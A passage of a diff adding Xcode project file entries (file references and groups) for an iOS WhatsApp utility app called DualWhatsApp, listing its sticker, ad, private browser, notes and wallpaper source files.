+		0F77C6802E97ACB700167DD8 /* Constant.swift */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.swift; path = Constant.swift; sourceTree = "<group>"; };
+		0F77C6812E97ACB700167DD8 /* Utility.swift */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.swift; path = Utility.swift; sourceTree = "<group>"; };
+		0F77C6832E97ACB700167DD8 /* YYAnimatedImageView.h */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.c.h; path = YYAnimatedImageView.h; sourceTree = "<group>"; };
+		0F77C6842E97ACB700167DD8 /* YYAnimatedImageView.m */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.c.objc; path = YYAnimatedImageView.m; sourceTree = "<group>"; };
+		0F77C6852E97ACB700167DD8 /* YYFrameImage.h */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.c.h; path = YYFrameImage.h; sourceTree = "<group>"; };
+		0F77C6862E97ACB700167DD8 /* YYFrameImage.m */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.c.objc; path = YYFrameImage.m; sourceTree = "<group>"; };
+		0F77C6872E97ACB700167DD8 /* YYImage.h */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.c.h; path = YYImage.h; sourceTree = "<group>"; };
+		0F77C6882E97ACB700167DD8 /* YYImage.m */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.c.objc; path = YYImage.m; sourceTree = "<group>"; };
+		0F77C6892E97ACB700167DD8 /* YYImageCoder.h */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.c.h; path = YYImageCoder.h; sourceTree = "<group>"; };
+		0F77C68A2E97ACB700167DD8 /* YYImageCoder.m */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.c.objc; path = YYImageCoder.m; sourceTree = "<group>"; };
+		0F77C68B2E97ACB700167DD8 /* YYSpriteSheetImage.h */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.c.h; path = YYSpriteSheetImage.h; sourceTree = "<group>"; };
+		0F77C68C2E97ACB700167DD8 /* YYSpriteSheetImage.m */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.c.objc; path = YYSpriteSheetImage.m; sourceTree = "<group>"; };
+		0F77C68E2E97ACB700167DD8 /* Assets.xcassets */ = {isa = PBXFileReference; lastKnownFileType = folder.assetcatalog; path = Assets.xcassets; sourceTree = "<group>"; };
+		0F77C6E12E97ACB900167DD8 /* AppDelegate.swift */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.swift; path = AppDelegate.swift; sourceTree = "<group>"; };
+		0F77C6E22E97ACB900167DD8 /* SceneDelegate.swift */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.swift; path = SceneDelegate.swift; sourceTree = "<group>"; };
+		0F77C7472E97CB8200167DD8 /* PrivateBrowser.storyboard */ = {isa = PBXFileReference; lastKnownFileType = file.storyboard; name = PrivateBrowser.storyboard; path = DualWhatsApp/UI/WASticker/PrivateBrowser.storyboard; sourceTree = SOURCE_ROOT; };
+		0F77C7492E97CBE100167DD8 /* PrivateBrowserVC.swift */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.swift; path = PrivateBrowserVC.swift; sourceTree = "<group>"; };
+		0F77C74C2E97D66200167DD8 /* PrivateNotes.storyboard */ = {isa = PBXFileReference; lastKnownFileType = file.storyboard; path = PrivateNotes.storyboard; sourceTree = "<group>"; };
+		0F77C74E2E97DA1300167DD8 /* PrivateNotesVC.swift */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.swift; path = PrivateNotesVC.swift; sourceTree = "<group>"; };
+		0F77C7552E97DF6E00167DD8 /* NoteTVCell.swift */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.swift; path = NoteTVCell.swift; sourceTree = "<group>"; };
+		0F77C7562E97DF6E00167DD8 /* NoteTVCell.xib */ = {isa = PBXFileReference; lastKnownFileType = file.xib; path = NoteTVCell.xib; sourceTree = "<group>"; };
+		0F77C7592E97E45D00167DD8 /* CreateNoteVC.swift */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.swift; path = CreateNoteVC.swift; sourceTree = "<group>"; };
+		0F77C75B2E97EC4100167DD8 /* DualWhatsApp.entitlements */ = {isa = PBXFileReference; lastKnownFileType = text.plist.entitlements; path = DualWhatsApp.entitlements; sourceTree = "<group>"; };
+		0F9AFBAF2E9672E0005B871B /* DualWhatsApp.app */ = {isa = PBXFileReference; explicitFileType = wrapper.application; includeInIndex = 0; path = DualWhatsApp.app; sourceTree = BUILT_PRODUCTS_DIR; };
+		0F9AFBCD2E9672EF005B871B /* Info.plist */ = {isa = PBXFileReference; lastKnownFileType = text.plist.xml; path = Info.plist; sourceTree = "<group>"; };
+		0F9AFBCE2E9672EF005B871B /* Base */ = {isa = PBXFileReference; lastKnownFileType = file.storyboard; name = Base; path = Base.lproj/LaunchScreen.storyboard; sourceTree = "<group>"; };
+		0F9AFBD02E9672EF005B871B /* Base */ = {isa = PBXFileReference; lastKnownFileType = file.storyboard; name = Base; path = Base.lproj/Main.storyboard; sourceTree = "<group>"; };
+		0F9AFBD32E9672EF005B871B /* ViewController.swift */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.swift; path = ViewController.swift; sourceTree = "<group>"; };
+		0F9AFBD52E9672EF005B871B /* DualWhatsApp.xcdatamodel */ = {isa = PBXFileReference; lastKnownFileType = wrapper.xcdatamodel; path = DualWhatsApp.xcdatamodel; sourceTree = "<group>"; };
+		0F9AFBDE2E9673B9005B871B /* swiftgen.yml */ = {isa = PBXFileReference; lastKnownFileType = text.yaml; path = swiftgen.yml; sourceTree = "<group>"; };
+		0F9AFD532E967F32005B871B /* GoogleService-Info.plist */ = {isa = PBXFileReference; lastKnownFileType = text.plist.xml; path = "GoogleService-Info.plist"; sourceTree = "<group>"; };
+		0FA55E7C2EAB38D0005BC557 /* StickerManager.swift */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.swift; path = StickerManager.swift; sourceTree = "<group>"; };
+		0FC424BC2E9CBA58006BDF58 /* ChatBackground.storyboard */ = {isa = PBXFileReference; lastKnownFileType = file.storyboard; path = ChatBackground.storyboard; sourceTree = "<group>"; };
+		0FC424C02E9CC206006BDF58 /* HomeVC.swift */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.swift; path = HomeVC.swift; sourceTree = "<group>"; };
+		0FC424C22E9CC210006BDF58 /* TrendingVC.swift */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.swift; path = TrendingVC.swift; sourceTree = "<group>"; };
+		0FC424C42E9CC21B006BDF58 /* CategoryVC.swift */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.swift; path = CategoryVC.swift; sourceTree = "<group>"; };
+		0FC424C62E9CC262006BDF58 /* ChatBackgroundTabbarVC.swift */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.swift; path = ChatBackgroundTabbarVC.swift; sourceTree = "<group>"; };
+		0FC424C92E9CCB39006BDF58 /* WallpaperCVCell.swift */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.swift; path = WallpaperCVCell.swift; sourceTree = "<group>"; };
+		0FC424CA2E9CCB39006BDF58 /* WallpaperCVCell.xib */ = {isa = PBXFileReference; lastKnownFileType = file.xib; path = WallpaperCVCell.xib; sourceTree = "<group>"; };
+		0FC424CD2E9CD1BF006BDF58 /* WallpaperCategoryCVCell.swift */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.swift; path = WallpaperCategoryCVCell.swift; sourceTree = "<group>"; };
+		0FC424CE2E9CD1BF006BDF58 /* WallpaperCategoryCVCell.xib */ = {isa = PBXFileReference; lastKnownFileType = file.xib; path = WallpaperCategoryCVCell.xib; sourceTree = "<group>"; };
+		0FC424D12E9CD286006BDF58 /* ViewWallpaperVC.swift */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.swift; path = ViewWallpaperVC.swift; sourceTree = "<group>"; };
+		0FC424D32E9CD44D006BDF58 /* ViewCategoryVC.swift */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.swift; path = ViewCategoryVC.swift; sourceTree = "<group>"; };
+		0FC424D62E9CFB7D006BDF58 /* PhotoVault.storyboard */ = {isa = PBXFileReference; lastKnownFileType = file.storyboard; path = PhotoVault.storyboard; sourceTree = "<group>"; };
+		0FC424D82E9CFB90006BDF58 /* PhotoVaultVC.swift */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.swift; path = PhotoVaultVC.swift; sourceTree = "<group>"; };
+		0FEBBEDB2E9FB6E1000A7950 /* DirectChat.storyboard */ = {isa = PBXFileReference; lastKnownFileType = file.storyboard; path = DirectChat.storyboard; sourceTree = "<group>"; };
+		0FEBBEDE2E9FB715000A7950 /* WebWhatsApp.storyboard */ = {isa = PBXFileReference; lastKnownFileType = file.storyboard; path = WebWhatsApp.storyboard; sourceTree = "<group>"; };
+		11083F092E98BC6A0051CADB /* FancyFonts.storyboard */ = {isa = PBXFileReference; lastKnownFileType = file.storyboard; path = FancyFonts.storyboard; sourceTree = "<group>"; };
+		11083F0B2E98BC840051CADB /* FancyFontsVC.swift */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.swift; path = FancyFontsVC.swift; sourceTree = "<group>"; };
+		11083F0E2E98BF380051CADB /* FancyFontsCell.swift */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.swift; path = FancyFontsCell.swift; sourceTree = "<group>"; };
+		11083F0F2E98BF380051CADB /* FancyFontsCell.xib */ = {isa = PBXFileReference; lastKnownFileType = file.xib; path = FancyFontsCell.xib; sourceTree = "<group>"; };
+		11083F122E98C9C90051CADB /* Helper+UILable.swift */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.swift; path = "Helper+UILable.swift"; sourceTree = "<group>"; };
+		11083F152E98E29D0051CADB /* SpeechToText.storyboard */ = {isa = PBXFileReference; lastKnownFileType = file.storyboard; path = SpeechToText.storyboard; sourceTree = "<group>"; };
+		11083F172E98E2FE0051CADB /* SpeechToTextVC.swift */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.swift; path = SpeechToTextVC.swift; sourceTree = "<group>"; };
+		11083F192E98E5A10051CADB /* SpeechManager.swift */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.swift; path = SpeechManager.swift; sourceTree = "<group>"; };
+		111D08F92E977F800062D4DF /* WebWhatsappVC.swift */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.swift; path = WebWhatsappVC.swift; sourceTree = "<group>"; };
+		111D08FB2E9789290062D4DF /* DirectChatVC.swift */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.swift; path = DirectChatVC.swift; sourceTree = "<group>"; };
+		117F49D62E9CBF020042816B /* EmojiLetterVC.swift */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.swift; path = EmojiLetterVC.swift; sourceTree = "<group>"; };
+		117F49D82E9CBF0E0042816B /* EmojiLetterVC.storyboard */ = {isa = PBXFileReference; lastKnownFileType = file.storyboard; path = EmojiLetterVC.storyboard; sourceTree = "<group>"; };
+		117F49E12E9D10880042816B /* WhatsCropping.storyboard */ = {isa = PBXFileReference; lastKnownFileType = file.storyboard; path = WhatsCropping.storyboard; sourceTree = "<group>"; };
+		117F49E32E9D10990042816B /* WhatsCroppingVC.swift */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.swift; path = WhatsCroppingVC.swift; sourceTree = "<group>"; };
+		11B2EE912E97CC4600A612F9 /* RepeatText.storyboard */ = {isa = PBXFileReference; lastKnownFileType = file.storyboard; path = RepeatText.storyboard; sourceTree = "<group>"; };
+		11B2EE932E97CC7700A612F9 /* RepeatTextVC.swift */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.swift; path = RepeatTextVC.swift; sourceTree = "<group>"; };
+		11D105152E9F60C9006FA033 /* CameraScan.storyboard */ = {isa = PBXFileReference; lastKnownFileType = file.storyboard; path = CameraScan.storyboard; sourceTree = "<group>"; };
+		11D105162E9F60C9006FA033 /* CameraScanerVC.swift */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.swift; path = CameraScanerVC.swift; sourceTree = "<group>"; };
+		11D1051A2E9F60E9006FA033 /* CameraScannerView.swift */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.swift; path = CameraScannerView.swift; sourceTree = "<group>"; };
+		11D1051C2E9F72C1006FA033 /* BarCodeVC.swift */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.swift; path = BarCodeVC.swift; sourceTree = "<group>"; };
+		11EB16A12E9CAFAD0000E310 /* FancyTextGenerator.swift */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.swift; path = FancyTextGenerator.swift; sourceTree = "<group>"; };
+		406DC6EDCD18D76A68755C9C /* Pods_DualWhatsApp.framework */ = {isa = PBXFileReference; explicitFileType = wrapper.framework; includeInIndex = 0; path = Pods_DualWhatsApp.framework; sourceTree = BUILT_PRODUCTS_DIR; };
+		5599BF0502356955F1B3ED0E /* Pods-DualWhatsApp.release.xcconfig */ = {isa = PBXFileReference; includeInIndex = 1; lastKnownFileType = text.xcconfig; name = "Pods-DualWhatsApp.release.xcconfig"; path = "Target Support Files/Pods-DualWhatsApp/Pods-DualWhatsApp.release.xcconfig"; sourceTree = "<group>"; };
+/* End PBXFileReference section */
+
+/* Begin PBXFrameworksBuildPhase section */
+		0F9AFBAC2E9672E0005B871B /* Frameworks */ = {
+			isa = PBXFrameworksBuildPhase;
+			buildActionMask = 2147483647;
+			files = (
+				1B7A5C5C4B8DFEDC3B13A221 /* Pods_DualWhatsApp.framework in Frameworks */,
+			);
+			runOnlyForDeploymentPostprocessing = 0;
+		};
+/* End PBXFrameworksBuildPhase section */
+
+/* Begin PBXGroup section */
+		0F3A8C212E98C1F600494FE8 /* StatusQuotes */ = {
+			isa = PBXGroup;
+			children = (
+				0F3A8C222E98C21700494FE8 /* Quotes.storyboard */,
+				0F3A8C242E98C22600494FE8 /* QuotesVC.swift */,
+				0F3A8C2D2E98CA4300494FE8 /* ViewQuotesVC.swift */,
+				0F3A8C282E98C56400494FE8 /* XIB */,
+			);
+			path = StatusQuotes;
+			sourceTree = "<group>";
+		};
+		0F3A8C282E98C56400494FE8 /* XIB */ = {
+			isa = PBXGroup;
+			children = (
+				0F3A8C292E98C57D00494FE8 /* QuotesTVCell.swift */,
+				0F3A8C2A2E98C57D00494FE8 /* QuotesTVCell.xib */,
+				0F3A8C2F2E98CAD900494FE8 /* ViewQuoteTVCell.swift */,
+				0F3A8C302E98CAD900494FE8 /* ViewQuoteTVCell.xib */,
+			);
+			path = XIB;
+			sourceTree = "<group>";
+		};
+		0F77C42A2E979AF300167DD8 /* WASticker */ = {
+			isa = PBXGroup;
+			children = (
+				0F77C4412E979C8C00167DD8 /* XIB */,
+				0F77C6282E97ACB300167DD8 /* Resource */,
+				0F77C4282E979AF300167DD8 /* WASticker.storyboard */,
+				0F77C4342E979BB300167DD8 /* StickerPackVC.swift */,
+				0F77C4362E979BF600167DD8 /* ViewStickerPackVC.swift */,
+			);
+			path = WASticker;
+			sourceTree = "<group>";
+		};
+		0F77C4412E979C8C00167DD8 /* XIB */ = {
+			isa = PBXGroup;
+			children = (
+				0F77C4422E979C9100167DD8 /* StickerPackTableViewCell.xib */,
+				0F77C4432E979C9100167DD8 /* StickerPackTableViewCell.swift */,
+				0F77C4462E979CA700167DD8 /* StickerCell.swift */,
+			);
+			path = XIB;
+			sourceTree = "<group>";
+		};
+		0F77C6282E97ACB300167DD8 /* Resource */ = {
+			isa = PBXGroup;
+			children = (
+				0F77C61E2E97ACB300167DD8 /* AquaButton.swift */,
+				0F77C61F2E97ACB300167DD8 /* GradientView.swift */,
+				0F77C6202E97ACB300167DD8 /* ImageData.swift */,
+				0F77C6212E97ACB300167DD8 /* Interoperability.swift */,
+				0F77C6222E97ACB300167DD8 /* Limits.swift */,
+				0F77C6232E97ACB300167DD8 /* Sticker.swift */,
+				0F77C6242E97ACB300167DD8 /* StickerPack.swift */,
+				0F77C6252E97ACB300167DD8 /* StickerPackManager.swift */,
+				0F77C6262E97ACB300167DD8 /* UIAlertController+Additions.swift */,
+				0F77C6272E97ACB300167DD8 /* WebPManager.swift */,
+			);
+			path = Resource;
+			sourceTree = "<group>";
+		};
+		0F77C63D2E97ACB700167DD8 /* AdManager */ = {
+			isa = PBXGroup;
+			children = (
+				0F77C6332E97ACB700167DD8 /* AdManager.swift */,
+				0F77C6342E97ACB700167DD8 /* AdsConfig.swift */,
+				0F77C6352E97ACB700167DD8 /* BannerAdsManager.swift */,
+				0F77C6362E97ACB700167DD8 /* FirebaseManager.swift */,
+				0F77C6372E97ACB700167DD8 /* InterstitialAdsManager.swift */,
+				0F77C6382E97ACB700167DD8 /* NativeAdsManager.swift */,
+				0F77C6392E97ACB700167DD8 /* NativeAdView.xib */,
+				0F77C63A2E97ACB700167DD8 /* NativeAdView_Medium.xib */,
+				0F77C63B2E97ACB700167DD8 /* NativeAdView_Small.xib */,
+				0F77C63C2E97ACB700167DD8 /* OpenAdsManager.swift */,
+			);
+			path = AdManager;
+			sourceTree = "<group>";
+		};
+		0F77C6422E97ACB700167DD8 /* ClassManager */ = {
+			isa = PBXGroup;
+			children = (
+				11D1051A2E9F60E9006FA033 /* CameraScannerView.swift */,
+				0F77C63E2E97ACB700167DD8 /* DefaultManager.swift */,
+				0F77C63F2E97ACB700167DD8 /* ReachabilityManager.swift */,
+				0F77C6402E97ACB700167DD8 /* VersionCheck.swift */,
+				0F77C6412E97ACB700167DD8 /* WebManager.swift */,
+				11083F192E98E5A10051CADB /* SpeechManager.swift */,
+				11EB16A12E9CAFAD0000E310 /* FancyTextGenerator.swift */,
+			);
+			path = ClassManager;
+			sourceTree = "<group>";
+		};
+		0F77C6492E97ACB700167DD8 /* Extension */ = {
+			isa = PBXGroup;
+			children = (
+				0F3A8C332E98DB6B00494FE8 /* Helper+UIColor.swift */,
+				0F77C6432E97ACB700167DD8 /* Helper+Common.swift */,
+				0F77C6442E97ACB700167DD8 /* Helper+Int.swift */,
+				0F77C6452E97ACB700167DD8 /* Helper+String.swift */,
+				0F77C6462E97ACB700167DD8 /* Helper+UIDevice.swift */,
+				0F77C6472E97ACB700167DD8 /* Helper+UIView.swift */,
+				0F77C6482E97ACB700167DD8 /* Helper+UIViewController.swift */,
+				11083F122E98C9C90051CADB /* Helper+UILable.swift */,
+			);
+			path = Extension;
+			sourceTree = "<group>";
+		};
+		0F77C67F2E97ACB700167DD8 /* SwiftGen */ = {
+			isa = PBXGroup;
+			children = (
+				0F77C67C2E97ACB700167DD8 /* Fonts.swift */,
+				0F77C67D2E97ACB700167DD8 /* Images.swift */,
+				0F77C67E2E97ACB700167DD8 /* Storyboards.swift */,
+			);
+			path = SwiftGen;
+			sourceTree = "<group>";
+		};
+		0F77C6822E97ACB700167DD8 /* Utility */ = {
+			isa = PBXGroup;
+			children = (
+				0F77C6802E97ACB700167DD8 /* Constant.swift */,
+				0F77C6812E97ACB700167DD8 /* Utility.swift */,
+			);
+			path = Utility;
+			sourceTree = "<group>";
+		};
+		0F77C68D2E97ACB700167DD8 /* WebP */ = {
+			isa = PBXGroup;
+			children = (
+				0F77C6832E97ACB700167DD8 /* YYAnimatedImageView.h */,
+				0F77C6842E97ACB700167DD8 /* YYAnimatedImageView.m */,
+				0F77C6852E97ACB700167DD8 /* YYFrameImage.h */,
+				0F77C6862E97ACB700167DD8 /* YYFrameImage.m */,
+				0F77C6872E97ACB700167DD8 /* YYImage.h */,
+				0F77C6882E97ACB700167DD8 /* YYImage.m */,
+				0F77C6892E97ACB700167DD8 /* YYImageCoder.h */,
+				0F77C68A2E97ACB700167DD8 /* YYImageCoder.m */,
+				0F77C68B2E97ACB700167DD8 /* YYSpriteSheetImage.h */,
+				0F77C68C2E97ACB700167DD8 /* YYSpriteSheetImage.m */,
+			);
+			path = WebP;
+			sourceTree = "<group>";
+		};
+		0F77C6902E97ACB700167DD8 /* Resources */ = {
+			isa = PBXGroup;
+			children = (
+				0F77C63D2E97ACB700167DD8 /* AdManager */,
+				0F77C6422E97ACB700167DD8 /* ClassManager */,
+				0F77C6492E97ACB700167DD8 /* Extension */,
+				11083F012E98BBAA0051CADB /* Fonts */,
+				0F77C67F2E97ACB700167DD8 /* SwiftGen */,
+				0F77C6822E97ACB700167DD8 /* Utility */,
+				0F77C68D2E97ACB700167DD8 /* WebP */,
+				0F77C68E2E97ACB700167DD8 /* Assets.xcassets */,
+				0F3A8C262E98C51F00494FE8 /* Status.json */,
+			);
+			path = Resources;
+			sourceTree = "<group>";
+		};
+		0F77C6E32E97ACB900167DD8 /* AppDelegate */ = {
+			isa = PBXGroup;
+			children = (
+				0FA55E7C2EAB38D0005BC557 /* StickerManager.swift */,
+				0F77C6E12E97ACB900167DD8 /* AppDelegate.swift */,
+				0F77C6E22E97ACB900167DD8 /* SceneDelegate.swift */,
+			);
+			path = AppDelegate;
+			sourceTree = "<group>";
+		};
+		0F77C7462E97CB7A00167DD8 /* PrivateBrowser */ = {
+			isa = PBXGroup;
+			children = (
+				0F77C7472E97CB8200167DD8 /* PrivateBrowser.storyboard */,
+				0F77C7492E97CBE100167DD8 /* PrivateBrowserVC.swift */,
+			);
+			path = PrivateBrowser;
+			sourceTree = "<group>";
+		};
+		0F77C74B2E97D64B00167DD8 /* PrivateNotes */ = {
+			isa = PBXGroup;
+			children = (
+				0F77C7502E97DAFF00167DD8 /* XIB */,
+				0F77C74C2E97D66200167DD8 /* PrivateNotes.storyboard */,
+				0F77C74E2E97DA1300167DD8 /* PrivateNotesVC.swift */,
+				0F77C7592E97E45D00167DD8 /* CreateNoteVC.swift */,
+			);
+			path = PrivateNotes;
+			sourceTree = "<group>";
+		};
+		0F77C7502E97DAFF00167DD8 /* XIB */ = {
+			isa = PBXGroup;
+			children = (
+				0F77C7552E97DF6E00167DD8 /* NoteTVCell.swift */,
+				0F77C7562E97DF6E00167DD8 /* NoteTVCell.xib */,
+			);
+			path = XIB;
+			sourceTree = "<group>";
+		};
+		0F9AFBA62E9672E0005B871B = {
+			isa = PBXGroup;
+			children = (
+				0F9AFBDE2E9673B9005B871B /* swiftgen.yml */,
+				0F9AFBD42E9672EF005B871B /* DualWhatsApp */,
+				0F9AFBB02E9672E0005B871B /* Products */,
+				7AF8F74C50A3DA9FA6EEB5DC /* Pods */,
+				D86CDB95E43B735B4482467D /* Frameworks */,
+			);
+			sourceTree = "<group>";
+		};
+		0F9AFBB02E9672E0005B871B /* Products */ = {
+			isa = PBXGroup;
+			children = (
+				46B5559042D04558847BBDC8 /* README.md */,
+				0F9AFBAF2E9672E0005B871B /* DualWhatsApp.app */,
+			);
+			name = Products;
+			sourceTree = "<group>";
+		};
+		0F9AFBD42E9672EF005B871B /* DualWhatsApp */ = {
+			isa = PBXGroup;
+			children = (
+				0F77C75B2E97EC4100167DD8 /* DualWhatsApp.entitlements */,
+				0F9AFBCC2E9672EF005B871B /* DualWhatsApp.xcdatamodeld */,
+				0F77C6E32E97ACB900167DD8 /* AppDelegate */,
+				0F77C6902E97ACB700167DD8 /* Resources */,
+				0F9AFD0D2E96795C005B871B /* UI */,
+				0F9AFBCD2E9672EF005B871B /* Info.plist */,
+				0F9AFD532E967F32005B871B /* GoogleService-Info.plist */,
+				0F77C3592E97954A00167DD8 /* DualWhatsApp-Bridging-Header.h */,
+			);
+			path = DualWhatsApp;
+			sourceTree = "<group>";
+		};
+		0F9AFD0D2E96795C005B871B /* UI */ = {
+			isa = PBXGroup;
+			children = (
+				0F9AFD0E2E96796B005B871B /* LaunchScreen */,
+				0F9AFD0F2E967979005B871B /* Main */,
+				0FEBBEDD2E9FB707000A7950 /* WebWhatsApp */,
+				0FEBBEDA2E9FB6D2000A7950 /* DirectChat */,
+				0F77C42A2E979AF300167DD8 /* WASticker */,
+				0F77C7462E97CB7A00167DD8 /* PrivateBrowser */,
+				11B2EE902E97CBEC00A612F9 /* RepeatText */,
+				0F77C74B2E97D64B00167DD8 /* PrivateNotes */,
+				11083F082E98BC4A0051CADB /* FancyFonts */,
+				0F3A8C212E98C1F600494FE8 /* StatusQuotes */,
+				11083F142E98E2850051CADB /* SpeechToText */,
+				117F49D52E9CBEE90042816B /* EmojiLetter */,
+				0FC424BB2E9CBA42006BDF58 /* ChatBackground */,
+				0FC424D52E9CFB6B006BDF58 /* PhotoVault */,
+				117F49DC2E9D10540042816B /* WhatsCropping */,
+				11D105172E9F60C9006FA033 /* CameraScan */,
+			);
+			path = UI;
+			sourceTree = "<group>";
+		};
+		0F9AFD0E2E96796B005B871B /* LaunchScreen */ = {
+			isa = PBXGroup;
+			children = (
+				0F9AFBCF2E9672EF005B871B /* LaunchScreen.storyboard */,
+			);
+			path = LaunchScreen;
+			sourceTree = "<group>";
+		};
+		0F9AFD0F2E967979005B871B /* Main */ = {
+			isa = PBXGroup;
+			children = (
+				0F9AFBD12E9672EF005B871B /* Main.storyboard */,
+				0F9AFBD32E9672EF005B871B /* ViewController.swift */,
+			);
+			path = Main;
+			sourceTree = "<group>";
+		};
+		0FC424BB2E9CBA42006BDF58 /* ChatBackground */ = {
+			isa = PBXGroup;
+			children = (
+				0FC424BC2E9CBA58006BDF58 /* ChatBackground.storyboard */,
+				0FC424C62E9CC262006BDF58 /* ChatBackgroundTabbarVC.swift */,
+				0FC424C02E9CC206006BDF58 /* HomeVC.swift */,
+				0FC424C22E9CC210006BDF58 /* TrendingVC.swift */,
+				0FC424C42E9CC21B006BDF58 /* CategoryVC.swift */,
+				0FC424D32E9CD44D006BDF58 /* ViewCategoryVC.swift */,
+				0FC424D12E9CD286006BDF58 /* ViewWallpaperVC.swift */,
+				0FC424C82E9CCAFC006BDF58 /* XIB */,
+			);
+			path = ChatBackground;
+			sourceTree = "<group>";
+		};
+		0FC424C82E9CCAFC006BDF58 /* XIB */ = {
+			isa = PBXGroup;
+			children = (
+				0FC424C92E9CCB39006BDF58 /* WallpaperCVCell.swift */,
+				0FC424CA2E9CCB39006BDF58 /* WallpaperCVCell.xib */,
+				0FC424CD2E9CD1BF006BDF58 /* WallpaperCategoryCVCell.swift */,
+				0FC424CE2E9CD1BF006BDF58 /* WallpaperCategoryCVCell.xib */,
+			);
+			path = XIB;
+			sourceTree = "<group>";
+		};
+		0FC424D52E9CFB6B006BDF58 /* PhotoVault */ = {
+			isa = PBXGroup;
+			children = (
+				0FC424D62E9CFB7D006BDF58 /* PhotoVault.storyboard */,
+				0FC424D82E9CFB90006BDF58 /* PhotoVaultVC.swift */,
+			);
+			path = PhotoVault;
+			sourceTree = "<group>";
+		};
+		0FEBBEDA2E9FB6D2000A7950 /* DirectChat */ = {
+			isa = PBXGroup;
+			children = (
+				0FEBBEDB2E9FB6E1000A7950 /* DirectChat.storyboard */,
+				111D08FB2E9789290062D4DF /* DirectChatVC.swift */,
+			);
+			path = DirectChat;
+			sourceTree = "<group>";
+		};
+		0FEBBEDD2E9FB707000A7950 /* WebWhatsApp */ = {
+			isa = PBXGroup;
+			children = (
+				0FEBBEDE2E9FB715000A7950 /* WebWhatsApp.storyboard */,
+				111D08F92E977F800062D4DF /* WebWhatsappVC.swift */,
+			);
+			path = WebWhatsApp;
+			sourceTree = "<group>";
+		};
+		11083F012E98BBAA0051CADB /* Fonts */ = {
+			isa = PBXGroup;
+			children = (
+			);
+			path = Fonts;
+			sourceTree = "<group>";
+		};
+		11083F082E98BC4A0051CADB /* FancyFonts */ = {
+			isa = PBXGroup;
+			children = (
+				11083F092E98BC6A0051CADB /* FancyFonts.storyboard */,
+				11083F0B2E98BC840051CADB /* FancyFontsVC.swift */,
+				11083F0D2E98BF1B0051CADB /* XIB */,
+			);
+			path = FancyFonts;
+			sourceTree = "<group>";
+		};
+		11083F0D2E98BF1B0051CADB /* XIB */ = {
+			isa = PBXGroup;
+			children = (
+				11083F0E2E98BF380051CADB /* FancyFontsCell.swift */,
+				11083F0F2E98BF380051CADB /* FancyFontsCell.xib */,
+			);
+			path = XIB;
+			sourceTree = "<group>";
+		};
+		11083F142E98E2850051CADB /* SpeechToText */ = {
+			isa = PBXGroup;
+			children = (
+				11083F152E98E29D0051CADB /* SpeechToText.storyboard */,
+				11083F172E98E2FE0051CADB /* SpeechToTextVC.swift */,
+			);
+			path = SpeechToText;
+			sourceTree = "<group>";
+		};
+		117F49D52E9CBEE90042816B /* EmojiLetter */ = {
+			isa = PBXGroup;
+			children = (
+				117F49D62E9CBF020042816B /* EmojiLetterVC.swift */,
+				117F49D82E9CBF0E0042816B /* EmojiLetterVC.storyboard */,
+			);
+			path = EmojiLetter;
+			sourceTree = "<group>";
+		};
+		117F49DC2E9D10540042816B /* WhatsCropping */ = {
+			isa = PBXGroup;
+			children = (
+				117F49E12E9D10880042816B /* WhatsCropping.storyboard */,
+				117F49E32E9D10990042816B /* WhatsCroppingVC.swift */,
+			);
+			path = WhatsCropping;
+			sourceTree = "<group>";
+		};
+		11B2EE902E97CBEC00A612F9 /* RepeatText */ = {
+			isa = PBXGroup;
+			children = (
+				11B2EE912E97CC4600A612F9 /* RepeatText.storyboard */,
+				11B2EE932E97CC7700A612F9 /* RepeatTextVC.swift */,
+			);
+			path = RepeatText;
+			sourceTree = "<group>";
+		};
+		11D105172E9F60C9006FA033 /* CameraScan */ = {
+			isa = PBXGroup;
+			children = (
+				11D105152E9F60C9006FA033 /* CameraScan.storyboard */,
+				11D105162E9F60C9006FA033 /* CameraScanerVC.swift */,
+				11D1051C2E9F72C1006FA033 /* BarCodeVC.swift */,
+			);
+			path = CameraScan;
+			sourceTree = "<group>";
+		};
+		7AF8F74C50A3DA9FA6EEB5DC /* Pods */ = {
+			isa = PBXGroup;
+			children = (
+				002F21CC905860C9B9EA9CA8 /* Pods-DualWhatsApp.debug.xcconfig */,
+				5599BF0502356955F1B3ED0E /* Pods-DualWhatsApp.release.xcconfig */,
+			);
+			path = Pods;
+			sourceTree = "<group>";
+		};
